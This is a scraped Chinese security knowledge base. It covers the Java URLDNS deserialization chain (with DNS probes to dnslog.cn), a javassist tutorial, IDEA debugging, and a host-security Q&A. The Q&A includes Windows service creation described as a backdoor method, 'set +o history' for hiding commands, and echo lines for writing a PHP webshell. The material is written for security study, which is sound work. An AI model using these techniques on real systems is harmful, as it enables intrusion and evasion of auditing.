根据上述的Gadget Chain，可见触发点是在HashMap.readObject()，为了节约时间，我们直接在HashMap.readObject()处下断点。 运行主程序开始反序列化，自动在我们下断点的地方暂停。 然后一直F8 根据Gadget Chain发现使用了putVal方法，但这不是重点，重点是会调用hash方法 跟进hash方法 如果key不是null就会调用key.hashCode方法，跟进hashCode方法，这里调用的是URL类中的hashCode方法 当hashCode属性不为-1时就直接return，就不会触发hashCode方法，也就不会触发接下来的DNS解析 这里hashCode值默认为 -1，所以会执行 handler.hashCode(this); URLDNS链中也通过反射将hashCode的值设置为-1 跟一下handler，看看是什么玩意儿 是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode 跟进hashCode方法，发现会调用getHostAddress方法对传入的URL对象进行解析 跟进getHostAddress方法，发现会调用getHost方法，然后调用InetAddress.getByName(host)发起DNS请求，至此整个过程完毕。 思考 分析过程中，发现HashMap.put方法中也调用了hash方法，然后去进行hashCode计算等。 那么就是说，在put操作的时候，也会触发对应的dns解析，试试看。 package org.example; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { HashMap map = new HashMap(); URL url = new URL(\"http://cgu44y.dnslog.cn/\"); map.put(url, 2); } } 成功获取到了DNS解析请求记录。 那么为什么ysoserial在生成序列化数据的时候，也调用了put方法，但是没有收到DNS解析记录呢？ 原因就在于继承抽象类URLStreamHandler的SilentURLStreamHandler类中，重写了openConnection和getHostAddress 因此在调用 put 方法的时候不会触发 dns 查询。 进行尝试重写了openConnection和getHostAddress，发现确实不能收到dns查询记录。 package org.example; import java.io.IOException; import java.net.*; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { URLStreamHandler urlStreamHandler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } @Override protected synchronized InetAddress getHostAddress(URL u){ return null; } }; HashMap map = new HashMap(); URL url = new URL(null, \"http://qyd9tm.dnslog.cn/\", urlStreamHandler); map.put(url, 2); } } 那这样我们反序列化的时候不是也因为重写了方法而不能进行 dns 查询吗？ 原因在于 URL 里面的 handler 设置的是 transient 我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。 然而在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，打个比方，如果一个用户有一些敏感信息（如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输，这些信息对应的变量就可以加上transient关键字。 也就是说transient修饰符无法被序列化，所以虽然它最后是没执行dns请求，但是在反序列化的时候还是会执行dns请求 测试一下transient package org.example; import java.io.*; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Test test = new Test(); // 设置值 test.test = \"Test Value\"; System.out.println(test.test); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(test); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Test serTest = (Test) objectInputStream.readObject(); System.out.println(serTest.test); } } class Test implements Serializable { transient public String test; } 可见反序列化后的值为null，说明序列化时并没有将test对应的值代入进去。 总结 这条链还是比较简单的，主要是反序列化过程中HashMap的Key会进行Key.HashCode()计算，如果Key传入的是URL(URL context, String spec, URLStreamHandler handler)类型（重写URLStreamHandler避免有多余的DNS请求），在计算hashCode()的时候，就会调用URLStreamHandler.hashCode()触发getHost方法对目标进行DNS解析。 举个例子： package org.example; import java.io.IOException; import java.net.MalformedURLException; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; public class App { public static void main(String[] args) throws MalformedURLException { /* * `URL(URL context, String spec, URLStreamHandler handler)`类型，在计算`hashCode()`的时候，就会调用`URLStreamHandler.hashCode()`触发`getHost`方法对目标进行DNS解析 * */ URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; URL url = new URL(null, \"http://k0e09d.dnslog.cn/\", handler); url.hashCode(); // 触发点 } } 整个调用链如下： HashMap.readObject() -> HashMap.putVal() -> HashMap.hash() -> URL.hashCode() -> URLStreamHandler.hashCode().getHostAddress() -> URLStreamHandler.getHostAddress().InetAddress.getByName() URLDNS 这个利用链主要用来检测是否存在反序列化漏洞，有如下两个优点： 使用java 内部的类进行构造，不依赖第三方库 如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:17:18 "},"知识库/02.JAVA安全/23.javassist字节码编程/":{"url":"知识库/02.JAVA安全/23.javassist字节码编程/","title":"23.javassist字节码编程","keywords":"","body":"介绍 javassist 是一个开源的分析、编辑和创建Java字节码的类库，通过javassist提供的API可以在java程序运行时编辑一个类的字节码信息，改变该类的结构信息。说简单点，就是一个用来处理Java字节码的类库。 除了Javassist，常见的字节码编程工具有ASM和byte-buddy，这两个工具相对来说更加偏向于底层，需要了解关于jvm的指令；使用javassist可以不需要了解jvm指令，只需使用javassist类库提供的API接口就可以实现字节码编程。 使用 常用类 javassist字节码编程常用的类： ClassPool：ClassPool 类可以控制的类的字节码，例如创建一个类或加载一个类，与JVM类装载器类似；它是基于哈希表（Hashtable）实现的CtClass对象容器，其中键名是类名称，值是表示该类的CtClass对象（Hashtable和Hashmap类似都是实现map接口，hashmap可以接收null的值，但是Hashtable不行）。 public static synchronized ClassPool getDefault() // 返回默认的类池对象。 public ClassPath insertClassPath(String pathname) // 在搜索路径的开头插入目录或jar（或zip）文件。 public ClassPath insertClassPath(ClassPath cp) // ClassPath在搜索路径的开头插入一个对象。 public ClassLoader getClassLoader() // 获取类加载器toClass()，getAnnotations()在 CtClass等 public CtClass get(String classname) // 从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。 public ClassPath appendClassPath(ClassPath cp) // 将ClassPath对象附加到搜索路径的末尾。 public CtClass makeClass(String classname) // 创建一个新的public类 CtClass： CtClass表示编译时的一个类，它提供了类的操作，如在类中动态添加新字段、方法和构造函数、以及改变类、父类和接口的方法 public void setSuperclass(CtClass clazz) // 更改超类，除非此对象表示接口。 public Class toClass(Lookup lookup) // 将此类转换为java.lang.Class对象。 public byte[] toBytecode() // 将该类转换为字节码数组。 public void writeFile() // 将由此CtClass对象表示的类文件写入当前目录。 public void writeFile(String directoryName) // 将由此CtClass 对象表示的类文件写入本地磁盘。 public CtConstructor makeClassInitializer() // 制作一个空的类初始化程序（静态构造函数）。 CtMethod：表示类中的方法，通过它可以给类创建新的方法，还可以修改返回类型，访问修饰符等，甚至还可以修改方法体内容代码 CtField：类的属性，通过它可以给类创建新的属性，还可以修改已有的属性的类型，访问修饰符等 CtConstructor：用于访问类的构造，与CtMethod类的作用类似 public void setBody(String src) // 设置构造函数主体 public void setBody(CtConstructor src, ClassMap map) // 从另一个构造函数复制一个构造函数主体。 public CtMethod toMethod(String name, CtClass declaring, ClassMap map) // 复制此构造函数并将其转换为方法 ClassClassPath：该类作用是用于通过getResourceAsStream()在java.lang.Class中获取类文件的搜索路径。 public ClassClassPath(Class c) // 构造函数，创建一个搜索路径 public URL find(String classname) // 获取指定类文件的URL public InputStream openClassfile(String classname) // 通过getResourceAsStream()获取类 依赖 org.javassist javassist 3.28.0-GA 举例 创建对象Test，并创建public static void main( String[] )方法，最后反射调用 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建 void main() 方法，（方法的返回值类型你，方法名，方法的参数类型，方法所属的类） CtMethod mainMethod = new CtMethod(CtClass.voidType, \"main\", new CtClass[]{classPool.get(String[].class.getName())}, test); // 设置main方法的访问修饰符 public static mainMethod.setModifiers(Modifier.PUBLIC + Modifier.STATIC); // 设置方法内容 mainMethod.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addMethod(mainMethod); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 讲test转换为字节码数组输出 System.out.println(Arrays.toString(test.toBytecode())); // 生成Class对象，反射调用main方法 Class aClass = test.toClass(); Object o = aClass.newInstance(); aClass.getDeclaredMethod(\"main\", String[].class).invoke(o, new String[1]); } } 创建构造函数，和刚才的差不多，微改即可 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建构造函数 CtConstructor constructor = new CtConstructor(null, test); // 设置main方法的访问修饰符 public constructor.setModifiers(Modifier.PUBLIC); // 设置方法内容 constructor.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addConstructor(constructor); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 生成Class对象，然后生成实例 Class aClass = test.toClass(); Object o = aClass.newInstance(); } } 参考 10-java安全基础——javassist字节码编程 Java安全之Javassist动态编程 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-11-04 12:35:34 "},"知识库/02.JAVA安全/24.IDEA断点调试/":{"url":"知识库/02.JAVA安全/24.IDEA断点调试/","title":"24.IDEA断点调试","keywords":"","body":"前言 代码审计过程中肯定是需要下断点让程序暂停进行分析的，所以很重要！！！ 调试技能重要性甚⾄超过学习⼀门语⾔ 本文主要是针对IDEA进行断点调试，IDEA YYDS 在调试代码的时候，你的项目得debug模式启动，也就是点那个绿色的甲虫启动服务器，然后，就可以在代码里面断点调试啦。 控制面板 参考https://blog.csdn.net/f641385712/article/details/93145454 大多数说明图片就直接Copy过来的，不足点再添加补充说明 进入断点管理界面 说明 断点 什么是断点 断点你可能天天都在使用，但是若真要你对它下定义，估计一时间还有点懵逼呢有木有？ 断点：是一种附加在源代码上面的特殊标记，在**调试模式(debug模式)**下可以触发**特定的动作**，比如打印线程调用栈信息、计算值、打印指定表达式的值等等。 Tips：断点一但设置就会一直保存在工程中直到手动删除~ 断点参数（断点属性） 断点并不是仅仅是孤立的存在的，它也可以通过参数进行定制化，这些叫断点参数。 不同类型的断点支持的断点参数也不尽相同，在下面具体介绍时会详细说明~ 断点的种类 据我粗略调查，80%的小伙伴打断点只会采用代码行左边鼠标单击这种最基础的方式打断点然后调试。其实在现实场景中，有非常非常多的情况下，这种方式将很难快速定位到问题所在，因此了解断点分类、调试技巧就显得有点必须了 殊不知，IDEA给我们提供了丰富的断点类型，让我们能够在不同的调试场景下，使用不同的断点类型来大大提高我们的调试效率，毕竟效率就是时间，而时间就是生命。 从idea断点对话框里也能够看出断点是分类的。然后下面我对断点的分类讲解不是完全按此分类，我的分类会更加详细如下： Line breakpoint（行断点）：在指定代码行设置断点，属于行级别的断点 Temporary line breakpoint（临时行断点）：与行断点类似，不同之处在于该类型的断点在被激活之后会被立即删除 Field watchpoint（属性断点）：读取或者修改属性时会激活属性断点 Method breakpoint（方法断点）：它是标记在方法那一行的断点，有自己特有的属性参数 Exception breakpoint（异常断点）：当程序抛出指定异常时会激活异常断点。与行断点不同，异常断点不需要与源代码映射（不需要打在具体某一行代码上），因为异常断点应用程序级别的Line breakpoint（行断点） 这是使用得最为广泛的一种断点。示例操作“视频“： 断点参数 作为第一个介绍的断点类型，这里有必要全面的解释一下上面行断点操作的断点参数： Suspend：有没有让你诧异到，它竟然是个复选框并且还可以不被选中。若它不被选中的话断点的相关动作依然激活执行，只是线程不会被组塞了而已。它的两种阻塞策略如下： All：阻塞该程序内所有线程（默认） Thread：只阻塞当前断点所在线程（在多线程调试、远程调试中强烈建议使用这种方式） Condition：这就是所谓的条件断点，只有书写的表达式返回true时候断点才会被激活 Log： 勾选\"Breakpoint hit message\"：断点激活时输出提示日志 勾选\"Stack trace\"：断点激活时输出程序调用栈信息 勾选\"Evaluate and log\"：并在下面的输入框中输入\"args\"，断点激活时会计算并输出变量 args 的值 可以同时选中 Temporary line breakpoint（临时行断点） 创建方法不说了，同上。和上面的唯一区别是：把Remove once hit这个复选框给勾选上（此类型断点其实使用较少）。 Field watchpoint（属性断点） 创建的方式和上无差异。（目前发现是针对的类中定义的变量） 断点参数 由于绝大多数参数第一个已经讲述了，so这里只剩一个它独有的参数： Watch：选中\"Filed Access\" 读取的时候都会断住。选中\"Filed madification\"表示修改的时候都会断住Method breakpoint（方法断点） 打断点方式同上，只是它是必须把断点打在方法那一行上。 它也有一个自己独有的参数： Watch： “Method entry”：进入方法时激活断点 “Method exit”：出去方法时激活断点 “Emulated”：目前发现没啥卵用（求小伙伴不要喷我~） Exception breakpoint（异常断点） 异常断点属于非常特殊的一种断点类型，它不对应任何一行代码，因为它属于程序级别的断点。 它不能像上面在代码处直接创建，只能通过上面的断点对话框来创建。 此处注意：异常断点中很多选项就是不能使用的（灰色）如下图示： 断点参数 但是同理，它也提供一个特有的断点参数： Notification： “Catch excetion”：程序在捕获（Try Catch）这个异常时激活断点 “Uncatch excetion”：不catch捕获异常时激活断点 小细节：对于不同类型的断点，打桩后我们看到的图标也是有差异的，如图： 条件断点 就是断点在满足条件的时候才会阻塞，不过一般也只能书写一些较简单的判定 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-11-04 12:34:37 "},"知识库/03.主机安全/01.乱七八糟的问题汇总（持续更新）.html":{"url":"知识库/03.主机安全/01.乱七八糟的问题汇总（持续更新）.html","title":"01.乱七八糟的问题汇总（持续更新）","keywords":"","body":"详细解释TCP三次握手 客户端在打算建立TCP连接时，向服务器发出连接请求报文，这时首部中的同部位SYN = 1，同时选择一个初始序号 seq = x，这时TCP客户程序进入SYN-SENT(同步已发送)状态 服务端在收到请求报文段后，如果同意建立连接，那么就向客户端发送确认。在确认报文段中将SYN，ACK = 1，确认号是ack = x + 1，并同时为自己选择一个初始序号seq = y，这时TCP服务器进入SYN-RCVD(同步收到)状态 TCP客户端收到服务端的确认之后，还要向服务端给出确认，确认报文ACK = 1，确认号ack = y + 1 , seq = x + 1，此时TCP连接已经建立，客户端进入ESTABLISHED(已建立连接)状态 备注： 确认号ack，是期望收到下一个报文段的第一个数据字节的序号 初始序列seq 同步SYN，在建立连接用来的同步序号，SYN置1就表示这是一个连接请求或连接接受报文 确认ACK，仅当ACK=1，确认号字段才有效，TCP规定，在连接建立后所有的传送报文都必须把ACK置1 为什么客户端第二次握手之后，还要最后确认一次？ 主要是为了防止已经失效的连接请求报文段突然又传送到了服务端，因而产生错误 正常情况：客户端发送连接请求，但因连接请求报文丢失而服务端未收到确认，于是客户端再重传一次连接请求。后面收到了确认，建立了连接。客户端发送了连个连接请求报文，其中第一个丢失，第二个到达服务端，没有“已经失效的连接请求报文” 异常情况：客户端发送连接请求，但连接请求报文并未丢失而是在某些网络节点长时间滞留了，以致于连接释放后的某个时间才到达服务端。服务端上一个连接已经释放后，现在接收到客户端“新的”连接请求报文（第一次滞留的报文），那么服务端向客户端发送确认报文，同意建立连接，那么两次握手，现在又会建立起新的连接 谈谈TCP 四次挥手 1.客户端把连接释放报文段首部的FIN（终止控制位）置 1，其序号 seq = u，这时客户端进入FIN-WAIT-1（终止等待1）状态 2.服务端收到连接释放报文后发出确认，ACK = 1，确认号是ack = u+1, 而这个报文的序号是 seq = v，然后服务端就进入CLOSE-WAIT（关闭等待）状态 此时客户端——>服务端这个方向上的连接就释放了，此时TCP处于半关闭状态，若服务端要给客户端发送数据，客户端还可以接收，客户端接收到服务端的之后，进入FIN-WAIT-2（终止等待2）状态，等待服务端发出连接释放报文段 3.若服务端没有要向客户端发送的数据，那么服务端通知TCP释放连接。服务端发出的连接释放报文必须使FIN = 1，确认报文ACK = 1,假设序列号seq = w；服务端还要重复上次发送的确认号，ack = u + 1 ，这是服务端进入LAST-ACK（最后确认状态），等待客户端确认 4.客户端收到服务端的连接释放报文之后，必须对此发出确认，在确认报文中，ACK = 1 ,确认号ack = w+1,seq = u + 1，此时服务端则关闭，客户端需要等待2MSL时间，才能关闭 NMAP 扫描端口半连接，全连接区别？ 半连接扫描（TCP SYN扫描）：这是一种秘密的扫描方式之一，因为在SYN扫描中Client和Server端没有形成3次握手，没有建立一个正常的TCP连接，因此不会被防火墙和IDS所记录，一般不会再目标主机上留下任何痕迹，但是这种扫描需要root权限 全连接扫描（TCP Connect扫描）这是一种普通的扫描方式，特点是：扫描速度快，准确性高，对操作者没有权限上的要求，但是容易被防火墙和IDS发现，扫描原理则是建立一个TCP连接 CentOS 7 编译安装nginx，如何将其加入到服务（nginx.service）？ # 默认编译安装到/usr/local/nginx # 在 /usr/lib/systemd/system/目录下创建服务 cd /usr/lib/systemd/system/ touch nginx.service vim nginx.service # 添加如下内容 [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=/usr/local/nginx/logs/nginx.pid ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target Linux 写入/usr/lib/systemd/system/xxx.service 不生效解决办法 systemctl daemon-reload nginx 如何配置Basic认证？ 配置nginx，新增server节点 针对es 配置 nginx basic 认证 server { listen 9201; server_name elasticSearch; location / { proxy_pass http://127.0.0.1:9200/; auth_basic \"nginx basic http for es\"; auth_basic_user_file conf.d/passwd; autoindex on; } } 再使用 openssl 或者htpasswd 生成密码文件(推荐使用openssl，系统自带，htpasswd可自行查询)，格式如下： 此处conf.d/passwd 是在/usr/local/nginx/conf/conf.d/passwd # openssl（默认自带） printf \"your_username:$(openssl passwd -crypt your_password)\\n\" >> conf.d/passwd 生成密码之后，使用如下命令检查配置文件是否正确 nginx -t 重启nginx docker Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 背景 由于尝试做docker api 未授权rce 漏洞，将docker.service 中的ExecStart 修改成了对外开放2375端口，最后测试完毕之后，将注释去掉之后，systemctl daemon-reload 之后启动成功之后，报错如下: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 且查看 systemctl status docker ，发现目标为active:running，且无/var/run/docker.sock文件 解决办法 将fd:// 更改为 unix://，然后重新加载systemctl daemon-reload，systemctl restart docker Docker启动镜像 在docker 中 要找一个新的镜像，我们首先要查看需要下载的镜像,这里以mysql举例 docker search mysql docker pull mysql 拉取完成之后，查看所有的镜像 docker images -a 启动镜像 docker run -p 本机映射端口:镜像映射端口 -d --name 启动镜像名称 -e 镜像启动参数 镜像名称:版本 # -p 本机端口和容器端口映射 # -d 后台运行 # --name 容器名称 # -e 镜像启动参数 例：https://hub.docker.com/_/mysql docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag 查看相关参数从hub.docker.com 中寻找，或者网传使用runlike docker run -p 3306:3306 -d --name mysql-aaron -e MYSQL_ROOT_PASSWORD=admin mysql:latest 运行完之后就可以看到容器已经启动 Docker清除缓存 docker system prune --volumes umount devices is busy？ NFS未授权挂载经常会出现此类问题 原因：因为有多个进程在使用，所以无法取消挂载，当将所有的进程kill掉之后，再umount即可 使用fuser命令罗列出pid fuser -v -m -v 表示 verbose 模式。进程以 ps 的方式显示，包括 PID、USER、COMMAND、ACCESS 字段 -m 表示指定文件所在的文件系统或者块设备（处于 mount 状态）。所有访问该文件系统的进程都被列出。 linux history添加执行的时间 bash shell 编辑/etc/profile 在最下方添加 HISTTIMEFORMAT=\"%Y-%m-%d %H:%M:%S\" 保存后退出，执行 source /etc/profile 效果如下 zsh 不需要配置，只需要执行 # 标准日期 history -i # 英文日期 history -E 登录shell，执行命令使其不保存至history？ set +o history 如何查看文件md5，sha1，sha256等（主要是windows） Linux 在linux中，查看文件md5，sha1，sha256等等都很简单，只需要键入命令 md5sum output b5cd11c42c9031cad6515ff62f4e03ac output sha1sum output 6c2c76a15c272db2b582e8f7d47c1f64b9b2f32c output sha256sum output a4ed89f176e5200ebe571631bd2fdb0d6e18a9ce7b5d78eb69b4a3abd538898b output windows certutil -hashfile MD5 certutil -hashfile SHA1 certutil -hashfile SHA256 windows 新建删除服务 常常用作后门 删除服务 sc delete 服务名称 新建服务 sc create monitor binpath= \"可执行文件exe绝对路径 --service -r 可执行文件根路径\" displayname= \"监控文件夹\" start= auto # sc create monitor binpath= \"D:\\Software\\OtherTool\\MonitorFolder.exe --service -r D:\\Software\\OtherTool\" displayname= \"监控文件夹\" start= auto Linux 安装pip2,pip3 // pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py // pip3 wget https://bootstrap.pypa.io/get-pip.py # 如果这里报错 ModuleNotFoundError: No module named 'distutils.util' # 执行如命令 apt install -f apt-get install python3-distutils python3 get-pip.py Linux 更新pip2 pip3 python2 -m pip install --upgrade pip python3 -m pip install --upgrade pip Linux 启动IDEA 报错 Error opening zip file or JAR manifest missing : /home/luogan/.jetbrains/jetbrains-agent-v3.2.0.de72.619 Error occurred during initialization of VM 背景 重装了idea，之前使用激活工具激活 find / -name \"*vmoptions*\" 删除/home/${User}/.IntelliJIdea2019.3/即可 Linux 配置开机自动挂载硬盘 背景 由于公司新发的thinkpad是SSD + HD ，我将操作系统装在了固态硬盘上，但是固态硬盘只有128G，HD却有500G，所以我只有格式化硬盘，将其挂载到我的硬盘上，具体如下所示 首先我们知道Linux是文件系统，硬盘也不例外，硬盘的标识是在/dev/sda0-6 sudo fdisk -l 可以看到我这里的硬盘是/dev/sda1，那么我将其挂载上的命令如下 sudo mount /dev/sda1 /my_HD mount | grep my_HD df -h 手动挂载虽然也行，但是毕竟不是服务器，不会不关机，那么就需要开机自动挂载硬盘 自动挂载 使用blkid命令查看磁盘uuid sudo blkid 可以看到/dev/sda1就是我的硬盘，Type是ext4，需要关注一下Type，linux 分区一般为 ext4，windows 分区一般为 ntfs 编辑/etc/fstab，将分区信息写入 /etc/fstab 文件启动自动挂载 sudo vim /etc/fstab UUID=744c071c-5e78-4dab-9d4c-cac5ea8e975d /my_HD ext4 defaults 0 1 注： ：分区定位，可以给UUID或LABEL，例如：UUID=6E9ADAC29ADA85CD或LABEL=software ：具体挂载点的位置，例如：/data：挂载磁盘类型,linux 分区一般为 ext4，windows 分区一般为 ntfs ：挂载参数，一般为defaults ：磁盘检查，默认为0 ：磁盘检查，默认为0，不需要检查 第一个叫fs_freq,用来决定哪一个文件系统需要执行dump操作，0就是不需要； 第二个叫fs_passno,是系统重启时fsck程序检测磁盘的顺序号 1 是root文件系统，2 是别的文件系统。fsck按序号检测磁盘，0表示该文件系统不被检测 dump 执行ext2的文件系统的备份操作 fsck 检测和修复文件系统 修改完成之后，执行 sudo mount -a rpm 包与 deb包相互转换 sudo apt intall alien sudo alien XMind-for-Linux-x86-64bit-11.0.1-202106220606.rpm Linux 执行命令时错误返回在shell时，如何将其去掉？ 一般正常情况下，shell会将所有的信息返回回来，如果此时需要去除错误，只需要执行成功的信息，只需要将错误重定向到某个文件即可，我在DNS隧道反弹shell总结过，其中xxx 表示执行的代码，2表示错误 xxx 2 > error windows 和 Linux shell的转义符 写一个一句话 # windows echo ^ > test.php # Linux echo \"\" > test.php echo \\ > test.php windows、Linux 在终端中如何设置临时代理 临时代理设置如下 windows cmd shell set http_proxy=127.0.0.1:10809 set https_proxy=127.0.0.1:10809 powershell $env:HTTP_PROXY=\"127.0.0.1:10809\" $env:HTTPS_PROXY=\"127.0.0.1:10809\" Linux export http_proxy=127.0.0.1:10809 export https_proxy=127.0.0.1:10809 Linux 更新系统字体 首先下载tff文件 然后执行如下命令 sudo mkdir /usr/share/fonts/msyh sudo cp *.ttf /usr/share/fonts/msyh/ sudo fc-cache -fv JDK1.7 在macos版本的idea 运行警告 /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java \"-javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=63173:/Applications/IntelliJ IDEA.app/Contents/bin\" -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/htmlconverter.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-doclet.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/tools.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes:/Users/aaronluo/.m2/repository/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections-3.1/commons-collections-3.1.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections4-4.0/commons-collections4-4.0.jar com.myproject.TestCC7 objc[20911]: Class JavaLaunchHelper is implemented in both /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java (0x1081794c0) and /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/libinstrument.dylib (0x10833f4e0). One of the two will be used. Which one is undefined. Process finished with exit code 0 该问题主要出现于 Mac 版本的 IntelliJ IDEA 之中，而引起该问题的原因，则是 Mac 中 JDK 的一个 BUG，如果你是jdk1.8.0_152之前的版本。它是由启动应用程序时 IDE 使用的 Java 代理触发的，此警告是无害的，我们可以安全地忽略，并且该问题已经在后续的 JDK 中得到了解决。 解决方式 既然该问题是由于 IDEA 启用代理引起的，那么我们禁止 IDEA 启动代理，即可解决该问题。 添加如下所示，并重启idea即可 idea.no.launcher=true 当然还可以升级JDK 到1.8.0_152+ MacOS docker 换源 安装好macos 下的docker 之后，直接点击Preferences，或者在桌面版点击齿轮图标，选中Docker Engine 修改如下 { \"debug\": true, \"experimental\": false, \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://hub-mirror.c.163.com\" ] } 最后点击右下角的apply & Restart 在命令行执行docker info命令就可以看到换好后的源 Kali 2019.4 换源之后，apt update 报错 root@kali:/usr# apt-get update 获取:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease [30.5 kB] 错误:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 已下载 30.5 kB，耗时 0秒 (32.6 kB/s) 正在读取软件包列表... 完成 W: 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository W: 无法下载 http://mirrors.ustc.edu.cn/kali/dists/kali-rolling/InRelease 下列签名无效： 